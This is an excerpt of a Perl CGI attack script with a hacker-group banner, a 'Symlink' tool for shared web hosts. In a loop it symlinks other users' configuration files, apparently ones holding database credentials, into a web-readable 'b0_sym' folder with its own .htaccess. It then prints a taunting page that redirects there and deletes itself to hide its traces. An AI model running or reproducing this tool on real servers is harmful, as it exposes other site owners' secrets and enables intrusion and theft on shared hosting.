...
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
#
#		Name : B0RU70 OZEL YETENEK PriV8 Symlink
#		http://facebook.com/B0RU70
#		
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
...
open(my $fh1, '>', 'b0_sym/.htaccess');
print $fh1 "$htaccess";
close $fh1;
open(my $xx, '>', 'b0_sym/nemu.txt');
print $xx "$sym";
close $xx;
...
foreach (@array){
	...
	symlink("$confignya","b0_sym/$usernya-$typeconfig.txt");
	mkdir "b0_sym/$usernya-$typeconfig.txt";
	symlink("$confignya","b0_sym/$usernya-$typeconfig.txt/0x1999.txt");
	copy("b0_sym/nemu.txt","b0_sym/$usernya-$typeconfig.txt/.htaccess") ;
	}
}
print "Content-type: text/html\n\n";
print "<head><title>Bypass 404 By 0x1999</title></head>";
print '<meta http-equiv="refresh" content="3; url=b0_sym"/>';
print '<body><center><h1>0x1999 And B0RU70 Never Die</h1>';
print '<a href="b0_sym">Click Me</a>';
unlink($0);
